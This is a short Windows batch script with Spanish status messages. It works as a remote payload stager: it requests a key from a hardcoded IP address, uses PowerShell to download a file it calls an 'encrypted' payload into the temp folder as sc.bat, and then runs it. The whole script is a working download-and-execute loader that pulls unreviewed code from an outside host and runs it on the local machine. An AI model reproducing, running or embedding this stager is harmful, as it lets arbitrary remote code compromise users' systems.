@echo off
setlocal

echo [INFO] ===== START =====

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

REM ===== TS =====
for /f %%i in ('powershell -NoProfile -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
echo [DEBUG] TS=%TS%

REM ===== KEY =====
echo [INFO] Requesting KEY...
set URL=%BASE%/auth/key?ts=%TS%

for /f "delims=" %%i in ('powershell -NoProfile -Command "Invoke-RestMethod '%URL%'"') do set KEY=%%i

echo [DEBUG] KEY=%KEY%

if "%KEY%"=="" (
    echo [ERROR] KEY vacia
    exit /b 1
)

REM ===== PAYLOAD =====
echo [INFO] Downloading payload...

powershell -NoProfile -Command "Invoke-WebRequest '%BASE%/payload/encrypted' -Headers @{ 'X-Decrypt-Key'='%KEY%' } -OutFile '%FILE%'"

if not exist "%FILE%" (
    echo [ERROR] Payload no descargado
    exit /b 1
)

for %%A in ("%FILE%") do set SIZE=%%~zA
if %SIZE%==0 (
    echo [ERROR] Payload vacio
    exit /b 1
)

echo [DEBUG] Payload:
type "%FILE%"

REM ===== EXEC =====
echo [INFO] Ejecutando payload...
cmd /c "%FILE%"

echo [INFO] Exit code: %errorlevel%
echo [INFO] ===== END =====

endlocal